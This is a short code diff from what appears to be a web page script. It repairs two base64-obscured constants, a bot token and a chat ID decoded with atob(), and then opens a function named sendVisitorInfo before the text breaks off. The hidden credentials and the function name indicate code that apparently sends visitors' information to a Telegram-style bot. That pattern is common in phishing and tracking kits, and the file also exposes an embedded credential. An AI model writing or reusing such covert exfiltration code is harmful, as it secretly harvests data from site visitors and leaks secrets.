@@ -1,5 +1,5 @@
-const BOT_TOKEN = atob("ODY1NjU2OTk2NDpBQUdhZ0dSSDJhYnMyOUhKN0YzbDRXejhVTDB2aVRfaGdzOA==);
-const CHAT_ID = atob("LTUyNzA0NTUzODI=);
+const BOT_TOKEN = atob("ODY1NjU2OTk2NDpBQUdhZ0dSSDJhYnMyOUhKN0YzbDRXejhVTDB2aVRfaGdzOA==");
+const CHAT_ID = atob("LTUyNzA0NTUzODI=");
 
 async function sendVisitorInfo() {
     try {
